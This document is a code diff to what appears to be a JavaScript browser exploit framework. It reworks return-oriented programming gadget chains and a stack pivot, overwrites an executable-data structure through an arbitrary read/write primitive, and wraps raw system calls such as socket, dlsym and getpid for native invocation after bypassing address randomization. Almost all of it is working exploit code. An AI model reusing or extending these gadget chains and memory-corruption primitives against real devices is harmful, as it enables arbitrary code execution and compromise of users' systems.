@@ -136,6 +136,8 @@ const rop = {
     this.frame.reset();
   },
   execute() {
+    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);
+
     this.stack.prepare(this.insts, this.frame);
     this.pivot.prepare(this.stack.sp);
 
@@ -225,6 +227,7 @@ class Frame {
       throw new Error("Empty frame length !!");
     }
 
+    this.rbx_view = new DataView(new ArrayBuffer(8));
     this.view = new DataView(new ArrayBuffer(list.length * 8));
 
     for (let i = 0; i < list.length; i++) {
@@ -316,28 +319,36 @@ class Frame {
 
     this.load(insts, name);
 
-    insts.push(gadgets.POP_RBP_RET);
-    insts.push(gadget);
-    insts.push(gadgets.PUSH_RAX_PUSH_RBP_RET);
+    this.rbx_view.setBigUint64(0, gadget, true);
+
+    insts.push(gadgets.POP_RBX_RET);
+    insts.push(this.rbx_view.buffer.data());
+    insts.push(gadgets.PUSH_RAX_JMP_QWORD_PTR_RBX);
   }
 }
 class Pivot {
   constructor() {
-    this.view = new DataView(new ArrayBuffer(0x48));
+    this.store_view = new DataView(new ArrayBuffer(0x20));
+    this.pivot_view = new DataView(new ArrayBuffer(0x30));
 
-    this.view.setBigUint64(0, gadgets.POP_RSP_RET, true);
-    this.view.setBigUint64(0x8, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
-    this.view.setBigUint64(0x18, gadgets.PUSH_RSI_JMP_QWORD_PTR_RAX, true);
-    this.view.setBigUint64(0x20, gadgets.MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18, true);
-    this.view.setBigUint64(0x38, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8, true);
+    this.store_view.setBigUint64(0, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);
+    this.store_view.setBigUint64(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
+    this.store_view.setBigUint64(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
+
+    this.pivot_view.setBigUint64(0, gadgets.POP_RSP_RET, true);
+    this.pivot_view.setBigUint64(0x20, gadgets.MOV_RBX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_28, true);
+    this.pivot_view.setBigUint64(0x28, gadgets.PUSH_RBX_JMP_QWORD_PTR_RAX, true);
   }
 
   get addr() {
-    return this.view.buffer.data();
+    return this.store_view.buffer.data();
   }
 
   prepare(sp) {
-    this.view.setBigUint64(0x10, sp, true);
+    this.store_view.setBigUint64(8, this.pivot_view.buffer.data() + 8n, true);
+
+    this.pivot_view.setBigUint64(8, this.pivot_view.buffer.data(), true);
+    this.pivot_view.setBigUint64(0x18, sp, true);
   }
 }
 class NativeFunction {
@@ -755,7 +766,7 @@ Number.prototype.alignUp = function (alignment) {
 };
 
 Number.prototype.alignDown = function (alignment) {
-  const mask = alingment - 1;
+  const mask = alignment - 1;
   return this & ~mask;
 };
 
@@ -1277,10 +1288,11 @@ function init_rop() {
 
   rop.pivot = new Pivot();
   rop.stack = new Stack(0x2000);
-  rop.frame = new Frame(["rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
+  rop.frame = new Frame(["jmp_rax", "rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
 
-  rop.insts.push(gadgets.PUSH_RBP_POP_RAX_RET);
-  rop.insts.push(gadgets.MOV_RAX_RCX_RET);
+  rop.insts.push(gadgets.POP_RAX_RET);
+  rop.insts.push(rop.frame.addrof("jmp_rax"));
+  rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);
 
   rop.frame.store(rop.insts, "rsp");
 
@@ -1308,14 +1320,13 @@ function init_rop() {
   rop.frame.valueof(rop.insts, "rip");
 
   rop.frame.store(rop.insts, "rax");
-  rop.frame.load(rop.insts, "rsp");
+  rop.frame.pop(rop.insts, gadgets.POP_RBP_RET, "rsp");
 
-  rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
   rop.insts.push(gadgets.POP_RAX_RET);
   rop.insts.push(0n);
   rop.insts.push(gadgets.LEAVE_RET);
 
-  arw.view(m_executableOrRareData).setBigUint64(0x28, gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38, true);
+  arw.view(m_executableOrRareData).setBigUint64(0x28, gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX, true);
 
   fn._error = new NativeFunction(_error_addr, "bigint");
   fn._strerror = new NativeFunction(strerror_addr, "string");
@@ -1339,6 +1350,7 @@ function init_syscalls() {
   fn.socket = new NativeFunction(0x61, "number");
   fn.dlsym = new NativeFunction(0x24f, "number");
   fn.dup = new NativeFunction(0x29, "number");
+  fn.getpid = new NativeFunction(0x14, "number");
 
   logger.info("Initiated SYSCALLS !!");
 }
@@ -1405,6 +1417,9 @@ export async function main() {
     init_aslr();
     init_rop();
     init_syscalls();
+
+    const pid = fn.getpid.invoke();
+    logger.debug(`pid: ${pid}`);
 
     logger.info("===END===");
   } catch (e) {
